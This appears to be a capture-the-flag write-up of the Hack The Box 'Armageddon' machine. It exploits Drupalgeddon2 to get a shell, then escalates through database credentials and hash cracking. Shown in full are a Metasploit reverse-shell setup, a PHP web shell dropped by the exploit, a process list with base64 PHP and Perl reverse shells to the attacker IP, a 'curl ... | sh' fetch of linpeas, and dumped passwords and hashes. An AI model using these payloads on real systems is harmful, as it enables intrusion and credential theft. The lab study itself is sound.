# Shell as Apache
Running `searchsploit -x php/webapps/18564.txt` reveals the following exploit for creating an administrator account:

![[Pasted image 20210330114822.png]]

Copying this into a `makeadmin.html` file and modifying the IP address produces the following result:

![[Pasted image 20210330115547.png]]

The necessary page is not present on this server, so the exploit will not work.

## Drupalgeddon

The module `php/remote/44482.rb` seems more appropriate, and is titled 'Drupalgeddon' which suggests a link to the box. Let's try it with metasploit:

```bash
┌──(mac㉿kali)-[~]
└─$ msfconsole

...[snip]...

msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
...[snip]...

   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection

...[snip]...

msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
```

This was one of the simpler metasploit setups I've ever done, and I only had to set `RHOSTS`, `LHOST`, and change the payload (I'm not a fan of meterpreter and am far more comfortable with a standard bash terminal when I can get one):

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.108
LHOST => 10.10.14.108
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.108:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Command shell session 2 opened (10.10.14.108:4444 -> 10.10.10.233:48294) at 2021-04-01 16:05:58 +0100

id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

We've got a shell!

## Enumeration

The first thing I tried was upgrading my shell. The standard Python method ([[Linux Shells#Upgrading a Shell]]) did not work, and backgrounding the shell doesn't seem to work within metasploit, so I carried on as I was.

There was little immediately interesting in the landing `/var/www/html` directory, so I did a search for files accessible by users in the `apache` group instead:

```bash
find / -group apache 2>/dev/null

...[omitting /proc and /var/www/html files]...

/usr/sbin/suexec
```

`/usr/sbin/suexec` stood out as an unusual file. Let's see what it is:

```bash
ls -la /usr/sbin/suexec
-r-x--x---. 1 root apache 15368 Nov 16 16:19 /usr/sbin/suexec

file /usr/sbin/suexec
/usr/sbin/suexec: executable, regular file, no read permission
```

I did a bit of playing around with trying to pass it some commands and execute as another user, but it turned out to be just a standard unix binary.

### /etc/passwd

We can view the other users on the box - the only one with a proper shell is `brucetherealadmin`:

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

There's nothing readable in Bruce's home directory, so we'll move on for now.

### Process Enumeration

`ss -lntp`:

```bash
ss -lntp
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      0      127.0.0.1:3306                     *:*                  
LISTEN     0      0            *:22                       *:*                  
LISTEN     0      0      127.0.0.1:25                       *:*                  
LISTEN     0      0         [::]:80                    [::]:*                  
LISTEN     0      0         [::]:22                    [::]:*                  
LISTEN     0      0        [::1]:25                    [::]:*   
```

`ps aux`:

```bash
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root       969  0.0  0.3 450272 15500 ?        Ss   12:37   0:01 /usr/sbin/httpd -DFOREGROUND
apache    1068  0.0  0.6 463124 24548 ?        S    12:37   0:00 /usr/sbin/httpd -DFOREGROUND
apache    2671  0.0  0.3 265192 13476 ?        S    13:02   0:02 php -r eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE0LjE2MCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
apache    2673  0.0  0.0  11692  1376 ?        S    13:02   0:00 /bin/sh
apache    2731  0.0  0.0  11824  1756 ?        S    13:05   0:00 bash -i
apache    5859  0.5  0.6 463880 25764 ?        S    14:50   0:54 /usr/sbin/httpd -DFOREGROUND
apache   12422  0.0  0.1  35008  4128 ?        S    16:16   0:00 perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.108:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
apache   12910  0.0  0.0  11688  1136 ?        S    16:23   0:00 bash
apache   12913  0.0  0.0  11692  1380 ?        S    16:23   0:00 /usr/bin/bash
apache   14739  0.1  0.6 463780 25416 ?        S    16:51   0:05 /usr/sbin/httpd -DFOREGROUND
apache   14742  0.1  0.6 463268 24864 ?        S    16:51   0:04 /usr/sbin/httpd -DFOREGROUND
apache   15282  0.0  0.6 463788 25524 ?        S    16:55   0:02 /usr/sbin/httpd -DFOREGROUND
apache   15653  0.0  0.6 463044 24604 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15655  0.0  0.6 463040 24676 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15657  0.0  0.6 463524 25140 ?        S    16:58   0:02 /usr/sbin/httpd -DFOREGROUND
apache   15658  0.0  0.6 463780 25284 ?        S    16:58   0:01 /usr/sbin/httpd -DFOREGROUND
apache   15696  0.0  0.6 463780 25504 ?        S    16:59   0:01 /usr/sbin/httpd -DFOREGROUND
apache   17122  0.0  0.6 463532 25560 ?        S    17:18   0:01 /usr/sbin/httpd -DFOREGROUND
apache   17235  0.0  0.6 463668 25432 ?        S    17:20   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17236  0.0  0.6 463048 24512 ?        S    17:20   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17686  0.1  0.6 463012 24624 ?        S    17:24   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17918  0.0  0.6 463524 25080 ?        S    17:26   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17984  0.0  0.6 462564 24224 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17986  0.0  0.2 450408  9548 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   17987  0.0  0.6 462564 24136 ?        S    17:27   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18579  0.0  0.2 450408  8700 ?        S    17:35   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18580  0.0  0.2 450408  8944 ?        S    17:35   0:00 /usr/sbin/httpd -DFOREGROUND
apache   18962  0.0  0.0  51732  1704 ?        R    17:38   0:00 ps aux
```

`netstat` yielded similar results. There were no useful-looking processes running as root, but there were two ports listening locally (3306 for MySQL, and port 25 which turned out to be postfix for sending emails).

Postfix turned out not to be exploitable, so let's dig around in home for a MySQL password.

### mysql

I started looking for creds in `/var/www/html`. There is an `INSTALL.mysql.txt` file which describes the mysql setup. At this point I wanted to try some default creds, but my uninteractive shell was failing to launch mysql so tried looking for another exploit to get a better shell.

I ran another searchsploit and tried to look for a PoC that wasn't metasploit based. The Drupal exploit seemed fairly simple, so I was confident that if I couldn't find one I could try and replicate it myself. Luckily, there was a prewritten one that worked:

```bash
$ searchsploit -x php/webapps/44449.py

...[looks good - previous ones had broken PoC code]...
...[check the usage function for how to run it]...

$ searchsploit -m php/webapps/44449.py
  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /home/mac/Documents/HTB/armageddon/44449.rb

$ ruby 44449.rb 10.10.10.233
ruby: warning: shebang line ending with \r may cause problems
Traceback (most recent call last):
	2: from 44449.rb:16:in `<main>'
	1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require'
/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require': cannot load such file -- highline/import (LoadError)
```

I had a missing dependency, so I grepped for anything that is required so I could install them all at once:

```bash
$ cat 44449.rb 10.10.10.233 | grep require
```

`highline\require` was the last one in the list, so I ran `gem search highline` to check the name and `sudo gem install highline`, then re-ran the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ruby 44449.rb 10.10.10.233
ruby: warning: shebang line ending with \r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo YKLHNMTR
[+] Result : YKLHNMTR
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

Much better! I can now actually test mysql login credentials:

```bash
armageddon.htb>> mysql -u root -p
Enter password: ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```

Unfortunately guessing creds didn't work, so I needed to find some.

Unfortunately this shell seems not to be able to handle the `>` character, which makes using the `find` command harder. Instead of redirecting stderr, we can use `find / -group apache | grep -v denied` to filter out errors.

We can check for SUID files, but there is nothing out of the ordinary:

```bash
armageddon.htb>> find / -perm /4000 | grep -v denied
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

I started searching for some default credentials. `drupal:drupal` is apparently the default set for drupal. However, the password prompt seems to immediately error out:

```bash
armageddon.htb>> mysql -u drupal -p 
Enter password: ERROR 1045 (28000): Access denied for user 'drupal'@'localhost' (using password: NO)
```

I am not sure if this is a problem with my shell, or the way the box is configured. Looking at the forum people suggested a similar problem, and were given hints to look at another service on the box. I looked for postgres and sqlite binaries too, but didn't find any. So I had a go at downloading linpeas after being unable to find creds manually.

### Linpeas

I started a webserver on my local machine with `python3 -m http.server`, and tried to download linpeas. Annoyingly, we don't seem to be able to change directory with this shell either...

```bash
armageddon.htb>> cd /tmp

armageddon.htb>> pwd
/var/www/html
armageddon.htb>> cd ~

armageddon.htb>> pwd
/var/www/html
```

Let's try and download the file to the CWD rather than `/tmp` (as we cannot even redirect it with `>`)

```bash
armageddon.htb>> wget 10.10.14.53:8000/linpeas.sh 
sh: wget: command not found
armageddon.htb>> curl 10.10.14.53:8000/linpeas.sh
curl: (7) Failed to connect to 10.10.14.53: Permission denied
armageddon.htb>> curl 8.8.8.8
^C[-] The target timed out ~ Net::ReadTimeout with #<TCPSocket:(closed)>
```

Uh oh - that didn't work very well. Perhaps there is a firewall setting on HTB boxes meaning it can't communicate outside of the VPN.

Either way, `curl localhost` works but I cannot hit my box to download linpeas. There may be a firewall setting preventing less well-known ports - I tried again with port 80.

On host machine:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ sudo python3 -m http.server 80
```

On the box:

```bash
armageddon.htb>> curl 10.10.14.53:80/linpeas.sh | sh
```

It worked!

#### Linpeas Highlights

Potential password:

```bash
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
...[snip]...
/var/www/html/sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
```

Potential interesting backup file:

```bash
[+] Backup files
-rw-r--r--. 1 root root 1735 Oct 30  2018 /etc/nsswitch.conf.bak
```

Active ports:

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -  
```

Potentially interesting process:

```bash
================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root       970  0.0  0.3 450272 15500 ?        Ss   12:00   0:00 /usr/sbin/httpd -DFOREGROUND
```

### Password Reuse

I tried to switch user with the found password:

```bash
armageddon.htb>> su brucetherealadmin
Password: su: System error
```

Just like with `mysql`, it errored immediately without letting me input a password.

The source of this password is the `sites/default/settings.php` file, which defines the following array:

```bash
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Trying to login to mysql with the `drupaluser` username also immediately fails. I also tried returning to the website at this point and logging in with the password as the `drupaluser` and `brucetherealadmin` users, but no luck.

I found some syntax for supplying the password and command on one line, and it worked!

```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'SHOW DATABASES;'
Database
information_schema
drupal
mysql
performance_schema
```

We can now try and extract some sensitive data (thank god):

```bash
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'SELECT * FROM users;'
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1617448243	1617448287	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
3	in7rud3r	$S$DItEwh5TIQW8orD5jrnuU3TJK..ZS2329Q964.okkfbrxymH1nYV	in7rud3r@in7rud3r.com			filtered_html	1617452134	0	0	0	Europe/London		0in7rud3r@in7rud3r.com	NULL
4	in7rud3r_2	$S$DuQ.4iMXzTm.HO3h67gK1Z7r/LzNXKE1zlFcUGQraWDtBURgewrZ	in7rud3r@armageddon.htb			filtered_html	1617452253	0	0	0	Europe/London		0in7rud3r@armageddon.htb	NULL
5	admin	$S$DupmX8rD2AYWEeZB8gPIF4FZIpHnhgAWubZ18pQo3iHBfaITNSt1	asdasd@mail.de			filtered_html	1617454769	0	0	0	Europe/London		0	asdasd@mail.de	NULL
6	test	$S$Da9BDioc9v1pjaulZIP.GehGIviXmcfl0g7tyD96O33hJQbR9YBg	test@test.com			filtered_html	1617454828	0	0	0	Europe/London		0	test@test.com	NULL
```

### Cracking the Password

We can see from hashcat's example hashes that this is a drupal hash (mode 7900). So we can crack it in hashcat using the following command:


```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ hashcat -m 7900 -a 0 hash /usr/share/wordlists/rockyou.txt
```

After a while, this gives us `booboo` as the password:

```bash
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Sat Apr  3 14:55:24 2021 (8 secs)
Time.Estimated...: Sat Apr  3 14:55:32 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       46 H/s (10.53ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 224/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:31744-32768
Candidates.#1....: tiffany -> freedom
```